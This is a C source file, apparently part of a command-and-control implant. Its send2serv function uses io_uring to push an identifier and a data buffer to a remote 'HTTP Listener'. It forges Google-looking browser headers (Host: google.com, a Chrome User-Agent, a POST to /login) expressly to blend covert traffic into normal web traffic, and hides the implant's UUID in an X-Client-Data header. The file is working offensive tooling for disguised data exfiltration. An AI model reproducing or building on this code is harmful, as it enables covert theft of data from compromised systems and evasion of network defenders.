#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <liburing.h>
#include "functions/connection/connection.h"
#include "functions/connection/req_struct.h"
#define QUEUE_DEPTH 3

int send2serv(const char *uuid, const char *buf, size_t len) {
    struct io_uring ring;

    if (io_uring_queue_init(QUEUE_DEPTH, &ring, 0) < 0) {
        perror("io_uring_queue_init");
        return -1;
    }

    request_t *req = malloc(sizeof(request_t));
    int sockfd = connection(&ring, req);

    // Add a bunch of dummy headers from google to blend in with normal-ish traffic
    //Only things that matter are the uuid and the content-length. I've tested it and it doens't work without content-length
    char header_buffer[1024];
    int header_len = snprintf(header_buffer, sizeof(header_buffer),
        "POST /login? HTTP/1.1\r\n"
        "Host: google.com\r\n"
        "Accept-Language: en-US,en;q=0.\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
        "Content-Length: %lu\r\n"
        "Sec-Ch-Ua-Mobile: ?0\r\n"
        "X-Client-Data: %s\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Priority: u=0, i\r\n"
        "Connection: keep-alive\r\n\r\n",
        len, uuid);

    if (header_len <= 0 || header_len >= sizeof(header_buffer)) {
        return -1;
    }

    // Initialize the sqe and send the headers back to the HTTP Listener
    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    io_uring_prep_send(sqe, sockfd, header_buffer, header_len, 0);
    io_uring_submit(&ring);

    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(&ring, &cqe);
    if (cqe->res < 0) {
        return -1;
    }
    // Mark as seen
    io_uring_cqe_seen(&ring, cqe);

    // Ensures all data is sent. Only problem is this is synchronous/blocking and doesn't take advantage of io_uring's advantage in perform asynchronous tasks. 
    size_t sent = 0;
    int ret;
    while (sent < len) {
        struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
        io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0);
        io_uring_submit(&ring);

        struct io_uring_cqe *cqe;
        io_uring_wait_cqe(&ring, &cqe);
        ret = cqe->res;
        io_uring_cqe_seen(&ring, cqe);

        if (ret <= 0) return ret;
        sent += ret;
    }

    close(req->client_socket);
    io_uring_queue_exit(&ring);
    free(req);
    return sent;
}